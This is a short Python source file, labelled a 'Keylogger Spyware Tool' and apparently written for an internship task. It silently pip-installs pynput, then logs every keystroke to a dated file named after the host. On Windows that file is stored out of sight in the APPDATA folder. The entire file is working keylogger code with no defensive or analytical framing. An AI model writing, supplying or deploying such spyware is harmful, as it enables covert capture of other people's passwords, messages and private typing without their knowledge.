# Keylogger Spyware Tool in Python By ~ Siddhesh Surve
# An Internship Based Task_4

import subprocess
import sys

# Function to check if a module is installed
def check_and_install(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"Module '{module_name}' not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        print("Module Installed Successfully!")
    finally:
        # Re-import the module after installation
        globals()[module_name] = __import__(module_name)

# List of required modules
required_modules = ["pynput"]

# Check and install each required module
for module in required_modules:
    check_and_install(module)

# Importing Modules
import os
from pynput import keyboard
import socket
from datetime import datetime

# Get the PC name
pc_name = socket.gethostname()

# Get the current date and time
now = datetime.now()
date_str = now.strftime("%d-%m-%Y")

# Determine the file path based on the operating system
if os.name == 'nt':  # Windows
    appdata_path = os.getenv('APPDATA')
    filename = os.path.join(appdata_path, f"keystrokes_{pc_name}_{date_str}.txt")
else:  # Assuming Linux or other OS
    filename = f"keystrokes_{pc_name}_{date_str}.txt"

def on_press(key):
    try:
        # Process the key press
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key).replace("Key.", "")
        
        # Write the processed key to the file with a comma and space after each key
        with open(filename, "a") as f:
            f.write(key_str + ", ")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
